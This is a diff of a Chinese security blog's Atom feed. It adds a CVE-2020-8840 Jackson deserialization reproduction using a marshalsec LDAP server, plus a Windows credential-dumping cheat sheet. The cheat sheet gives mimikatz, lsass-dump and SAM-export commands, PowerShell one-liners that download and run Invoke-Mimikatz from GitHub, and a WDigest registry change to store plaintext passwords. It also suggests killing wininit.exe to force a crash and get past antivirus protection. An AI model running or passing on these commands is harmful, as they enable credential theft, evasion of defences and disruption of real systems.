@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://thekingofduck.github.io</id>
     <title>CoolCat&apos; Blog</title>
-    <updated>2020-03-17T08:39:06.566Z</updated>
+    <updated>2020-03-18T15:02:23.840Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://thekingofduck.github.io"/>
     <link rel="self" href="https://thekingofduck.github.io/atom.xml"/>
@@ -82,41 +82,6 @@
 <li>WX:TheKingOfGaGaGa</li>
 <li>Github:<a href="https://github.com/TheKingOfDuck">https://github.com/TheKingOfDuck</a></li>
 </ul>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[利用MySQL bin函数再次提升盲注效率]]></title>
-        <id>https://thekingofduck.github.io/post/li-yong-mysql-bin-han-shu-zai-ci-ti-sheng-mang-zhu-xiao-lu/</id>
-        <link href="https://thekingofduck.github.io/post/li-yong-mysql-bin-han-shu-zai-ci-ti-sheng-mang-zhu-xiao-lu/">
-        </link>
-        <updated>2020-03-16T11:58:47.000Z</updated>
-        <content type="html"><![CDATA[<p>团队奶哥提供的思路~</p>
-<h3 id="基础知识">基础知识</h3>
-<p>常见提升盲注效率的常见思路无非两个：</p>
-<ul>
-<li>1.DNSLog</li>
-<li>2.二分法</li>
-</ul>
-<h3 id="mysql盲注中的dnslog">MySQL盲注中的DNSLog</h3>
-<p>都知道MySQL DNSlog盲注依赖于<code>load_file()</code>函数,然而该函数是有利用条件的，体现为：</p>
-<ul>
-<li>
-<p><code>secure_file_priv</code>的值要求不是null.</p>
-</li>
-<li>
-<p><code>ROOT权限</code></p>
-<p>和写shell不同，如果只需要不为null即可。</p>
-</li>
-</ul>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[深究浏览器探针]]></title>
-        <id>https://thekingofduck.github.io/post/shen-jiu-liu-lan-qi-tan-zhen/</id>
-        <link href="https://thekingofduck.github.io/post/shen-jiu-liu-lan-qi-tan-zhen/">
-        </link>
-        <updated>2020-03-10T08:26:20.000Z</updated>
-        <content type="html"><![CDATA[<p>11</p>
 ]]></content>
     </entry>
     <entry>
@@ -631,6 +596,120 @@ lsass.exe -&gt; 认证</p>
 <figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/1582974824988.png" alt="" loading="lazy"></figure>
 <p>原生，动静小。</p>
 <p>适合防御严格的内网扫描。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CVE-2020-8840复现]]></title>
+        <id>https://thekingofduck.github.io/post/CVE-2020-8840/</id>
+        <link href="https://thekingofduck.github.io/post/CVE-2020-8840/">
+        </link>
+        <updated>2020-02-25T11:02:24.000Z</updated>
+        <content type="html"><![CDATA[<p>Windows环境下执行命令的将下面的代码编译成class放到服务器上</p>
+<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/1582827828394.png" alt="" loading="lazy"></figure>
+<p>在class的同目录执行：</p>
+<pre><code>python -m http.server 8080
+</code></pre>
+<p>开启一个简陋的web服务。</p>
+<p>然后执行：</p>
+<pre><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://localhost:8080/#Exploit
+</code></pre>
+<p>开启ldap服务。</p>
+<p>执行POC：</p>
+<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/1582827821182.png" alt="" loading="lazy"></figure>
+<p>大功告成</p>
+<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/1582827319103.png" alt="" loading="lazy"></figure>
+<p>如代码所示，需要开启enableDefaultTyping方法才能成功，非默认配置。</p>
+<p>踩坑：把exp代码放到package中会加载后执行不成功，独立出来就好了。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Windows本地hashdump备忘录]]></title>
+        <id>https://thekingofduck.github.io/post/Dumping-Windows-Local-Credentials-Tools/</id>
+        <link href="https://thekingofduck.github.io/post/Dumping-Windows-Local-Credentials-Tools/">
+        </link>
+        <updated>2020-02-23T12:21:08.000Z</updated>
+        <content type="html"><![CDATA[<p>市面上可见到的读Windows本地密码的大多工具都是变则法子的去读lsass.exe这个密码的内存或者SAM数据库，然后从里面提取hash。所以有杀软的情况下读密码这事根本就不是工具免不免杀的问题，而是杀软有没有监控保护lsass.exe或SAM的问题，所以读本地密码条件可以总结为：</p>
+<blockquote>
+<p>能正常访访问lsass.exe内存或SAM数据库。</p>
+</blockquote>
+<h3 id="常见工具">常见工具</h3>
+<p>工具仅部分，通过以下操作可一键获取密码。</p>
+<h4 id="mimikatz">mimikatz</h4>
+<p>https://github.com/gentilkiwi/mimikatz</p>
+<pre><code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;  &quot;exit&quot;
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/1582465339806.png" alt="" loading="lazy"></figure>
+<h4 id="quarkspwdump">QuarksPwDump</h4>
+<p>https://github.com/quarkslab/quarkspwdump</p>
+<pre><code>QuarksPwDump.exe -dhl
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/1582466664583.png" alt="" loading="lazy"></figure>
+<h4 id="wce">wce</h4>
+<p>https://www.ampliasecurity.com/research/wcefaq.html</p>
+<pre><code>wce.exe -w
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/1582468276845.png" alt="" loading="lazy"></figure>
+<h4 id="pwdump7">pwdump7</h4>
+<p>http://www.tarasco.org/security/pwdump_7/index.html</p>
+<pre><code>PwDump7.exe
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://thekingofduck.github.io/post-images/1582469996459.png" alt="" loading="lazy"></figure>
+<h4 id="lazagne">LaZagne</h4>
+<p>https://github.com/AlessandroZ/LaZagne</p>
+<pre><code>laZagne_x86.exe windows
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://thekingofduck.github.io/post-images/1582470996820.png" alt="" loading="lazy"></figure>
+<h3 id="lsass内存dump">lsass内存dump</h3>
+<p>工具仅部分，通过以下操作可先获取到lsass内存文件，然后使用mimikatz可进一步读取密码。<br>
+参考命令:</p>
+<pre><code>mimikatz.exe&quot;sekurlsa::minidump lsass.dmp&quot;&quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot;
+</code></pre>
+<h4 id="sharpdump">SharpDump</h4>
+<p>https://github.com/GhostPack/SharpDump</p>
+<pre><code>for /f  &quot;tokens=2&quot; %i in ('tasklist /FI &quot;IMAGENAME eq lsass.exe&quot; /NH') do SharpDump.exe %i
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://thekingofduck.github.io/post-images/1582476581586.png" alt="" loading="lazy"></figure>
+<h4 id="procdump">ProcDump</h4>
+<p>https://docs.microsoft.com/en-us/sysinternals/downloads/procdump</p>
+<pre><code>Procdump.exe -accepteula -ma lsass.exe lsass.dmp
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://thekingofduck.github.io/post-images/1582471683393.png" alt="" loading="lazy"></figure>
+<h4 id="sqldumper">SqlDumper</h4>
+<p>https://support.microsoft.com/en-us/help/917825/use-the-sqldumper-exe-utility-to-generate-a-dump-file-in-sql-server</p>
+<pre><code>for /f  &quot;tokens=2&quot; %i in ('tasklist /FI &quot;IMAGENAME eq lsass.exe&quot; /NH') do Sqldumper.exe %i 0 0x01100
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://thekingofduck.github.io/post-images/1582473006736.png" alt="" loading="lazy"></figure>
+<h4 id="rundll32">rundll32</h4>
+<p>https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/</p>
+<pre><code>for /f  &quot;tokens=2&quot; %i in ('tasklist /FI &quot;IMAGENAME eq lsass.exe&quot; /NH') do rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump %i .\lsass.dmp full
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://thekingofduck.github.io/post-images/1582475904292.png" alt="" loading="lazy"></figure>
+<h3 id="关于sam数据库">关于SAM数据库</h3>
+<p>管理员执行:</p>
+<pre><code>reg save hklm\sam .\sam.hive&amp;reg save hklm\system .\system.hive
+</code></pre>
+<p>然后将两个文件导入SAMInside并将NT-Hash复制出来去相关网站查询即可。（mimikatz也可以读）</p>
+<h3 id="关于无文件加载">关于无文件加载</h3>
+<pre><code>powershell &quot;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds&quot;
+</code></pre>
+<figure data-type="image" tabindex="10"><img src="https://thekingofduck.github.io/post-images/1582480293151.png" alt="" loading="lazy"></figure>
+<p>读一下代码会发现都是peloader做的，同理可以把procdump做成psh实现无文件dump。</p>
+<pre><code>powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/TheKingOfDuck/hashdump/master/procdump/procdump.ps1');Invoke-Procdump64 -Args '-accepteula -ma lsass.exe lsass.dmp'&quot;
+</code></pre>
+<figure data-type="image" tabindex="11"><img src="https://thekingofduck.github.io/post-images/1582492124419.png" alt="" loading="lazy"></figure>
+<h3 id="关于2012以及win10之后的机器">关于2012以及win10之后的机器：</h3>
+<pre><code>reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+</code></pre>
+<p>键值为1时Wdigest Auth保存明文口令，为0则不保存明文。修改为重新登录生效。</p>
+<h3 id="偏激的bypass卡巴读密码">偏激的bypass卡巴读密码</h3>
+<p>卡巴以及小红伞均对lsass.exe进行了保护，导致微软出的两款工具以及他自己的kldumper都无法用于dump lsass。但是可以通过制造蓝屏来获取所有内存的文件MEMORY.DMP没然后在提出lsass进一步读取。</p>
+<pre><code>taskkill /f /im &quot;wininit.exe&quot;
+</code></pre>
+<p>可参考: https://www.mrwu.red/web/2000.html</p>
+<h3 id="总结">总结</h3>
+<p>bypass av可以以卡巴为衡量标准，能过卡巴约等于过全部。</p>
+<p>所以文件最终文件放在：</p>
+<p>https://github.com/TheKingOfDuck/hashdump</p>
 ]]></content>
     </entry>
 </feed>
